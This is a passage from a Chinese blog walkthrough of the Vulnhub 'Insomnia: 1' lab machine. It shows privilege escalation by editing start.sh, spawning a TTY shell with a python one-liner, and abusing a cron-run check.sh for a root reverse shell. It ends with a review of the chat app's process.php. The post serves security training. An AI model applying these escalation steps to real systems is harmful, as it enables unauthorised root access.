+<p>有权编辑 <code>start.sh</code> ，提权至 <code>julia</code></p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404271611997.png" /></p>
+<p>拿个交互 shell</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c <span class="string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404271618241.png" /></p>
+<p>根据提示 check.sh 可能是定时任务</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/crontab /etc/cron.d/* <span class="comment"># 定时任务</span></span><br></pre></td></tr></table></figure>
+<p>确实是定时任务，利用 check.sh 弹个 root 的 shell</p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404271620757.png" /></p>
+<p>kali 开启监听等一会</p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404271620758.png" /></p>
+<p>拿到 root 权限</p>
+<h3 id="回顾">2.3. 回顾</h3>
+<p>process.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="variable">$function</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;function&#x27;</span>];</span><br><span class="line">    <span class="variable">$log</span> = <span class="keyword">array</span>();</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">switch</span>(<span class="variable">$function</span>) &#123;</span><br><span class="line">    </span><br><span class="line">         <span class="keyword">case</span>(<span class="string">&#x27;getState&#x27;</span>):</span><br><span class="line">                 <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="string">&#x27;chat.txt&#x27;</span>))&#123;</span><br><span class="line">               <span class="variable">$lines</span> = <span class="title function_ invoke__">file</span>(<span class="string">&#x27;chat.txt&#x27;</span>);</span><br><span class="line">                 &#125;</span><br><span class="line">             <span class="variable">$log</span>[<span class="string">&#x27;state&#x27;</span>] = <span class="title function_ invoke__">count</span>(<span class="variable">$lines</span>); </span><br><span class="line">                 <span class="keyword">break</span>;</span><br><span class="line">    </span><br><span class="line">         <span class="keyword">case</span>(<span class="string">&#x27;update&#x27;</span>):</span><br><span class="line">                <span class="variable">$state</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;state&#x27;</span>];</span><br><span class="line">                <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="string">&#x27;chat.txt&#x27;</span>))&#123;</span><br><span class="line">                   <span class="variable">$lines</span> = <span class="title function_ invoke__">file</span>(<span class="string">&#x27;chat.txt&#x27;</span>);</span><br><span class="line">                 &#125;</span><br><span class="line">                 <span class="variable">$count</span> =  <span class="title function_ invoke__">count</span>(<span class="variable">$lines</span>);</span><br><span class="line">                 <span class="keyword">if</span>(<span class="variable">$state</span> == <span class="variable">$count</span>)&#123;</span><br><span class="line">                         <span class="variable">$log</span>[<span class="string">&#x27;state&#x27;</span>] = <span class="variable">$state</span>;</span><br><span class="line">                         <span class="variable">$log</span>[<span class="string">&#x27;text&#x27;</span>] = <span class="literal">false</span>;</span><br><span class="line">                         </span><br><span class="line">                         &#125;</span><br><span class="line">                         <span class="keyword">else</span>&#123;</span><br><span class="line">                                 <span class="variable">$text</span>= <span class="keyword">array</span>();</span><br><span class="line">                                 <span class="variable">$log</span>[<span class="string">&#x27;state&#x27;</span>] = <span class="variable">$state</span> + <span class="title function_ invoke__">count</span>(<span class="variable">$lines</span>) - <span class="variable">$state</span>;</span><br><span class="line">                                 <span class="keyword">foreach</span> (<span class="variable">$lines</span> <span class="keyword">as</span> <span class="variable">$line_num</span> =&gt; <span class="variable">$line</span>)</span><br><span class="line">                       &#123;</span><br><span class="line">                                           <span class="keyword">if</span>(<span class="variable">$line_num</span> &gt;= <span class="variable">$state</span>)&#123;</span><br><span class="line">                         <span class="variable">$text</span>[] =  <span class="variable">$line</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;\n&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$line</span>);</span><br><span class="line">                                           &#125;</span><br><span class="line">         </span><br><span class="line">                        &#125;</span><br><span class="line">                                 <span class="variable">$log</span>[<span class="string">&#x27;text&#x27;</span>] = <span class="variable">$text</span>; </span><br><span class="line">                         &#125;</span><br><span class="line">                  </span><br><span class="line">             <span class="keyword">break</span>;</span><br><span class="line">         </span><br><span class="line">         <span class="keyword">case</span>(<span class="string">&#x27;send&#x27;</span>):</span><br><span class="line">                  <span class="variable">$nickname</span> = <span class="title function_ invoke__">htmlentities</span>(<span class="title function_ invoke__">strip_tags</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;nickname&#x27;</span>]));</span><br><span class="line">                         <span class="variable">$reg_exUrl</span> = <span class="string">&quot;/(http|https|ftp|ftps)\:\/\/[a-zA-Z0-9\-\.]+\.[a-zA-Z]&#123;2,3&#125;(\/\S*)?/&quot;</span>;</span><br><span class="line">                          <span class="variable">$message</span> = <span class="title function_ invoke__">htmlentities</span>(<span class="title function_ invoke__">strip_tags</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;message&#x27;</span>]));</span><br><span class="line">                 <span class="keyword">if</span>((<span class="variable">$message</span>) != <span class="string">&quot;\n&quot;</span>)&#123;</span><br><span class="line">        </span><br><span class="line">                         <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="variable">$reg_exUrl</span>, <span class="variable">$message</span>, <span class="variable">$url</span>)) &#123;</span><br><span class="line">                        <span class="variable">$message</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$reg_exUrl</span>, <span class="string">&#x27;&lt;a href=&quot;&#x27;</span>.<span class="variable">$url</span>[<span class="number">0</span>].<span class="string">&#x27;&quot; target=&quot;_blank&quot;&gt;&#x27;</span>.<span class="variable">$url</span>[<span class="number">0</span>].<span class="string">&#x27;&lt;/a&gt;&#x27;</span>, <span class="variable">$message</span>);</span><br><span class="line">                                &#125; </span><br><span class="line">                         </span><br><span class="line">        </span><br><span class="line">                 <span class="title function_ invoke__">fwrite</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;chat.txt&#x27;</span>, <span class="string">&#x27;a&#x27;</span>), <span class="string">&quot;&lt;span&gt;&quot;</span>. <span class="variable">$nickname</span> . <span class="string">&quot;&lt;/span&gt;&quot;</span> . <span class="variable">$message</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;\n&quot;</span>, <span class="string">&quot; &quot;</span>, <span class="variable">$message</span>) . <span class="string">&quot;\n&quot;</span>); </span><br><span class="line">                 &#125;</span><br><span class="line">                 <span class="keyword">break</span>;</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$log</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>可见不但 POST 的 file 参数没用，对 message 也做了注入防御……</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>本文作者： </strong>Ghost
+  </li>
+  <li class="post-copyright-link">
+      <strong>本文链接：</strong>
+      <a href="https://z9m8r8.github.io/2024/04/27/Insomnia%201/" title="Insomnia: 1">https://z9m8r8.github.io/2024/04/27/Insomnia 1/</a>
+  </li>
+  <li class="post-copyright-license">
+      <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/Vulnhub-%E9%9D%B6%E5%9C%BA/" rel="tag"><i class="fa fa-tag"></i> Vulnhub 靶场</a>
+              <a href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" rel="tag"><i class="fa fa-tag"></i> 信息收集</a>
+              <a href="/tags/%E6%8F%90%E6%9D%83/" rel="tag"><i class="fa fa-tag"></i> 提权</a>
+              <a href="/tags/%E5%8F%8D%E5%BC%B9-shell/" rel="tag"><i class="fa fa-tag"></i> 反弹 shell</a>
+              <a href="/tags/Fuzzing/" rel="tag"><i class="fa fa-tag"></i> Fuzzing</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2024/04/26/Crossroads%201/" rel="prev" title="Crossroads: 1">
+                  <i class="fa fa-angle-left"></i> Crossroads: 1
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 2020 – 
+    <span itemprop="copyrightYear">2024</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">Ghost</span>
+  </div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+    <span title="站点总字数">213k</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">12:53</span>
+  </span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+  <a href="https://github.com/z9m8r8" class="github-corner" title="在 GitHub 上关注我" aria-label="在 GitHub 上关注我" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/next-theme-pjax/0.6.0/pjax.min.js" integrity="sha256-vxLn1tSKWD4dqbMRyv940UYw4sXgMtYcK6reefzZrao=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/5.0.28/fancybox/fancybox.umd.js" integrity="sha256-ytMJGN3toR+a84u7g7NuHm91VIR06Q41kMWDr2pq7Zo=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/lozad.js/1.16.0/lozad.min.js" integrity="sha256-mOFREFhqmHeQbXpK2lp4nA3qooVgACfh88fpJftLBbc=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pangu/4.0.7/pangu.min.js" integrity="sha256-j+yj56cdEY2CwkVtGyz18fNybFGpMGJ8JxG3GSyO2+I=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script><script src="/js/pjax.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+  <script src="/js/third-party/fancybox.js"></script>
+
+  <script src="/js/third-party/pace.js"></script>
+
+
+  
+
+
+
+
+  
+
+  <script class="next-config" data-name="enableMath" type="application/json">true</script><script class="next-config" data-name="mathjax" type="application/json">{"enable":true,"tags":"ams","js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mathjax/3.2.2/es5/tex-mml-chtml.js","integrity":"sha256-MASABpB4tYktI2Oitl4t+78w/lyA+D7b/s9GEP0JOGI="}}</script>
+<script src="/js/third-party/math/mathjax.js"></script>
+
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/quicklink/2.3.0/quicklink.umd.js" integrity="sha256-yvJQOINiH9fWemHn0vCA5lsHWJaHs6/ZmO+1Ft04SvM=" crossorigin="anonymous"></script>
+  <script class="next-config" data-name="quicklink" type="application/json">{"enable":true,"home":true,"archive":true,"delay":true,"timeout":3000,"priority":true,"url":"https://z9m8r8.github.io/2024/04/27/Insomnia%201/"}</script>
+  <script src="/js/third-party/quicklink.js"></script>
+
+</body>
+</html>
